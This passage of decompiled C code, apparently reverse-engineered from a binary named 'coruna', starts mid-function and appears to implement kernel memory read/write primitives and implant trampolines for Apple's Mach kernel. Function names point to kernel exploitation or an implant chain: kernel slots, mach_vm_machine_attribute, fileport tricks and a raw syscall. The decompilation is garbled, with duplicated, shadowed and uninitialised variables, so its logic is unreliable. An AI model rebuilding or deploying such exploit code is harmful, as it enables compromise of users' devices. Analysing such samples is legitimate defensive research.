    return;
  }
  ___stack_chk_fail();
}
void coruna_macho_data_seg_40dec(long handle,long addr_2)
{
  unsigned long u;
  int err;
  int status;
  uint64_t size;
  long handle;
  uint64_t scratch;
  unsigned long bootargs;
  long thread_attr;
  uint64_t host_info;
  long serial_buf;
  
  host_info = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
    return;
  }
  err = *(int *)(handle + 0x140);
  if ((1 < err - 0x1f53U && err != 0x2258) && err != 0x1c1b) {
    return;
  }
  err = coruna_kernel509_residual_307(handle,addr_2 + 0x28,&serial_buf);
  if (err == 0) {
    return;
  }
  if (serial_buf == 0) {
    coruna_macho_map_segsect(&scratch,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__DATA","__data");
    if (bootargs == 0) {
      return;
    }
    if (thread_attr == 0) {
      return;
    }
    u = bootargs;
    do {
      if ((bootargs + thread_attr) - 0x100 <= u) {
        return;
      }
      size = coruna_helper_127b4_1b298_stub(scratch,u);
      size = coruna_kernel509_via_fn_ptr_cast_10_9(handle,size);
      handle = coruna_kernel5_residual_225(handle,size);
      if (((handle != 0) && (handle = coruna_helper_127b4_1b298_stub(scratch,u + 8), handle == 0)) &&
         (handle = coruna_helper_127b4_1b298_stub(scratch,u + 0x10), handle == 10)) {
        handle = coruna_helper_127b4_1b298_stub(scratch,u + 0x18);
        if (handle != 0) {
          size = coruna_helper_127b4_1b298_stub(scratch,u + 0x20);
          size = coruna_kernel509_via_fn_ptr_cast_10_9(handle,size);
          handle = coruna_kernel5_residual_225(handle,size);
          if (handle != 0) {
            if (u == 0) {
              return;
            }
            err = coruna_mach_vm_machine_attribute(handle,addr_2 + 0x88,0x10000);
            if (err == 0) {
              return;
            }
            err = coruna_call_mach_vm_machine_attribute_1d4f8_2b614(handle,u + 0x18,&host_info,8);
            if (err == 0) {
              return;
            }
            err = 0x14;
            while( true ) {
              coruna_semaphore_timedwait(handle,250000);
              status = coruna_kernel509_residual_307(handle,addr_2 + 0x28,&serial_buf);
              if (status == 0) {
                return;
              }
              if (serial_buf != 0) break;
              err = err + -1;
              if (err == 0) {
                return;
              }
            }
            return;
          }
        }
      }
      u = u + (long)*(int *)(handle + 0x168);
    } while( true );
  }
  coruna_fn_ptr_cast_2(handle);
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b9a4(long handle,long addr_2,unsigned long arg,unsigned long arg,long off_3,
                 uint64_t val)
{
  uint u;
  int err;
  int status;
  long handle;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  uint kind;
  uint scratch;
  unsigned long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  int action;
  uint64_t block_ctx;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t stack_guard;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t path_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t tmp_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t region;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t plist;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  long url_buf;
  
  url_buf = *(long *)k_kernel_stack_chk_guard_slot;
  action = -1;
  host_info = 0;
  cache_22 = 0;
  plist = 0;
  cache_24 = 0;
  cache_23 = 0;
  kind = 0x145fffff;
  cache = 0;
  region = 0;
  cache_21 = 0;
  cache_20 = 0;
  json_buf = 0;
  tmp_buf = 0;
  work = 0;
  frame = 0;
  region = 0;
  path_buf = 0;
  url_buf = 0;
  plist = 0;
  sa_new = 0;
  sa_new = 0;
  tmp_buf = 0;
  path_buf = 0;
  block_ctx = 0;
  sa_saved = 0;
  sa_saved = 0;
  stack_guard = 0;
  host_info = 0;
  stack_guard = 0;
  action = 0;
  serial_buf = 0;
  scratch = 0;
  block_ctx = 0;
  thread_attr = 0;
  bootargs = 0;
  handle = 0x28;
  if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
    handle = 0x20;
  }
  err = coruna_kernel509_residual_307(handle,handle + addr_2,&thread_attr);
  if (((err != 0) && (handle = coruna_fn_ptr_cast_2(handle,thread_attr), handle != 0)) &&
     ((int)arg - 1U < 0x100)) {
    if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
      bootargs = arg | 1;
fail:
      err = coruna_open_dev_null(&action);
      if ((err == 0) && (err = coruna_call_mach_vm_machine_attribute_1d4f8_2bae8(handle,arg,&block_ctx,arg), err != 0)) {
        err = coruna_kernel509_residual_299();
        if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
          err = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,thread_attr + (unsigned long)(uint)(*(int *)(handle + 0x180) * err),
                               (long)*(int *)(handle + 0x168),&host_info);
          if ((err != 0) && (handle = coruna_fn_ptr_cast_2(handle,host_info), handle != 0)) {
            while( true ) {
              err = coruna_kernel509_residual_299();
              status = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,thread_attr +
                                           (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                                   &serial_buf);
              if (status == 0) break;
              host_info = coruna_u64_pack((host_info), (serial_buf));
              status = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,host_info,4,&scratch);
              if (status == 0) break;
              if (scratch == 0) {
                if (off_3 != 0) {
                  coruna_kernel509_via_helper_5d2c_419fc_2(handle,val);
                }
              }
              else {
                if (8 < scratch) break;
                status = coruna_kernel509_residual_299();
                if (status == err) {
                  handle = host_info + (unsigned long)((scratch - 1) * *(int *)(handle + 0x168)) + 8;
                  coruna_call_mach_vm_machine_attribute_1d4f8_2bae8(handle,handle,&bootargs,4);
                  break;
                }
              }
            }
          }
        }
        else {
          err = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,thread_attr + (unsigned long)(uint)(*(int *)(handle + 0x180) * err)
                                       + 8,(long)*(int *)(handle + 0x168),&host_info);
          if ((err != 0) && (handle = coruna_fn_ptr_cast_2(handle,host_info), handle != 0)) {
            err = coruna_kernel509_residual_299();
            status = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,thread_attr +
                                         (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                                 &scratch);
            while (status != 0) {
              u = scratch & 0xffff;
              if ((u == 0) && (kind = scratch >> 0x10, kind == 0)) {
                if (off_3 != 0) {
                  coruna_kernel509_via_helper_5d2c_419fc_2(handle,val);
                }
              }
              else {
                scratch = kind & 0xffff;
                if (u != 0) {
                  scratch = u;
                }
                if (7 < scratch - 1) break;
                handle = 0x10;
                if (u != 0) {
                  handle = 8;
                }
                status = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,thread_attr + handle +
                                             (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                                     &serial_buf);
                if (status == 0) break;
                host_info = coruna_u64_pack((host_info), (serial_buf));
                status = coruna_kernel509_residual_299();
                if (status == err) {
                  handle = host_info + (unsigned long)((scratch - 1) * *(int *)(handle + 0x168));
done:
                  coruna_call_mach_vm_machine_attribute_1d4f8_2bae8(handle,handle,&bootargs,4);
                  break;
                }
              }
              err = coruna_kernel509_residual_299();
              status = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,thread_attr +
                                           (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                                   &scratch);
            }
          }
        }
      }
    }
    else {
      err = 0;
      size = arg & 0xffffffff;
      bootargs = arg + size * -0x400;
      version = arg;
      port = arg;
      tag = arg;
      do {
        if ((*(unsigned long *)(handle + 0x188) & tag) == 0) {
          bootargs = port;
          if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
            bootargs = version | 1;
          }
          goto fail;
        }
        tag = tag - size;
        port = port + (1 - size);
        version = version + (4 - size);
        err = err + 1;
      } while (err != 0x400);
    }
  }
  if (action != -1) {
    coruna_close();
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != url_buf) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b9a4_2(long handle,long addr_2,unsigned long arg,unsigned long *arg,long off_3,
                 uint64_t val)
{
  uint u;
  uint size;
  uint version;
  int err;
  int status;
  long handle;
  uint scratch;
  unsigned long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint32_t scratch;
  int serial_buf;
  
  serial_buf = -1;
  host_info = 0;
  handle = 0x28;
  if (*(unsigned long *)(handle + 0x158) < 0x1c1b1914600000) {
    handle = 0x20;
  }
  err = coruna_kernel509_residual_307(handle,handle + addr_2,&thread_attr);
  if ((((err != 0) && (handle = coruna_fn_ptr_cast_2(handle,thread_attr), handle != 0)) &&
      (err = coruna_open_dev_null(&serial_buf), err == 0)) &&
     (((err = coruna_kernel509_residual_299(), 0x1c1b19145fffff < *(unsigned long *)(handle + 0x158) &&
       (err = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,thread_attr + (unsigned long)(uint)(*(int *)(handle + 0x180) * err) + 8
                             ,(long)*(int *)(handle + 0x168),&host_info), err != 0)) &&
      (handle = coruna_fn_ptr_cast_2(handle,host_info), handle != 0)))) {
    err = coruna_kernel509_residual_299();
    status = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,thread_attr + (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                         &scratch);
    if (status != 0) {
      do {
        version = scratch;
        u = scratch & 0xffff;
        size = u;
        if (u == 0) {
          if (0xffff < scratch) {
            size = scratch >> 0x10;
            if (7 < (uint)((unsigned long)size - 1)) break;
          }
          if (off_3 != 0) {
            coruna_kernel509_via_helper_5d2c_419fc_2(handle,val);
          }
        }
        else {
fail:
          if (7 < (uint)((unsigned long)size - 1)) break;
          handle = 0x10;
          if (u != 0) {
            handle = 8;
          }
          status = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,thread_attr + handle +
                                       (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,&scratch
                              );
          if (status == 0) break;
          host_info = coruna_u64_pack((host_info), (scratch));
          bootargs = 0;
          status = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,host_info +
                                       (long)*(int *)(handle + 0x168) * ((unsigned long)size - 1),
                               (long)*(int *)(handle + 0x168),&bootargs);
          if (status == 0) break;
          handle = coruna_fn_ptr_cast_2(handle,bootargs & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)
                              );
          if (handle != 0) {
            bootargs = (bootargs & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)) +
                       (*(unsigned long *)(handle + 0x188) & bootargs) * (arg & 0xffffffff);
            scratch = (version & 0xffff0000) - 0x10000;
            if (u != 0) {
              scratch = version & 0xffff0000;
              version = version - 1;
            }
            scratch = scratch | version & 0xffff;
            status = coruna_kernel509_residual_299();
            if (status == err) {
              err = coruna_call_mach_vm_machine_attribute_1d4f8_2bae8(handle,thread_attr +
                                           (unsigned long)(uint)(*(int *)(handle + 0x180) * err),
                                   &scratch,4);
              if (err != 0) {
                *arg = bootargs;
              }
              break;
            }
          }
        }
        err = coruna_kernel509_residual_299();
        status = coruna_call_mach_vm_machine_attribute_1d4f8_2b9a4(handle,thread_attr + (unsigned long)(uint)(*(int *)(handle + 0x180) * err),4,
                             &scratch);
      } while (status != 0);
    }
  }
  if (serial_buf != -1) {
    coruna_close();
  }
  return;
}
void coruna_fileport_makeport(void)
{
  _fileport_makeport();
  return;
}
void coruna_fileport_makefd(void)
{
  _fileport_makefd();
  return;
}
void coruna_syscall(void)
{
  _syscall(0x17d);
  return;
}
void coruna_ret_stub_9(void)
{
  __get_cpu_capabilities();
  return;
}
void coruna_helper_12310_418c8(void)
{
  return;
}
void coruna_helper_5d2c_4190c(void)
{
  return;
}





void coruna_kernel509_nop(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 uint64_t off_5)
{
  coruna_implant_trampoline_fn indirect_target;
  
  if (k_kernel_rodata_word_41978 != 0) {
    coruna_helper_5d2c_419fc();
    coruna_ret_stub_7(val,id_2,size_3,off_4,off_5);
    return;
  }
  (*indirect_target)();
  return;
}





void coruna_kernel509_via_helper_5d2c_419fc_2(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
                 uint64_t off_5)
{
  coruna_implant_trampoline_fn indirect_target;
  
  if (k_kernel_rodata_word_41978 != 0) {
    coruna_helper_5d2c_419fc();
    coruna_ret_stub_7(val,id_2,size_3,off_4,off_5);
    return;
  }
  (*indirect_target)();
  return;
}
void coruna_helper_5d2c_419fc(void)
{
  return;
}
void coruna_helper_5d2c_41a38(void)
{
  return;
}
void coruna_helper_5d2c_41a74(void)
{
  return;
}
void coruna_helper_5d2c_41ab0(void)
{
  return;
}





void coruna_ret_stub_6(uint64_t val,uint64_t id_2)
{
  (*k_kernel_rodata_word_41978)(0xb389,val,id_2,k_kernel_rodata_word_41968);
  return;
}





void coruna_ret_stub_7(uint64_t val,uint64_t id_2)
{
  (*k_kernel_rodata_word_41978)(0xb389,val,id_2,k_kernel_rodata_word_41970);
  return;
}

